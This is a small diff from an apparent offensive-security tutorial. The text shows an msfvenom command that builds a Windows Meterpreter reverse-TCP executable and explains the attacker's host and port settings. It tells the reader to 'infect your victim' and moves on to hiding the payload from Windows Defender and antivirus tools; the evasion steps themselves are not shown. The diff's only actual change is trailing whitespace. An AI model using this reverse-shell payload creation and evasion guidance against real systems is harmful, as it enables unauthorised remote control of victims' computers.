@@ -17,7 +17,7 @@ $ sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f ex
 ```
 Okay so, what does the do? This command creates a compiled binary that contains the payload `windows/meterpreter/reverse_tcp` which is a payload that allows us to start a Metasploit session once they run the program.
 
-<i>HOST</i> refers to the ip of the attacker (127.0.0.1)
+<i>HOST</i> refers to the ip of the attacker (127.0.0.1)  
 <i>PORT</i> refers to the port that you will listen to on your attacking machine (4444)
 
 You now have your payload and it's time to infect your victim! Except, oh wait! Windows Defender and every antivirus every made will detect this because it's been exposed to the public for years. So, how do we hide it and make it undetectable?
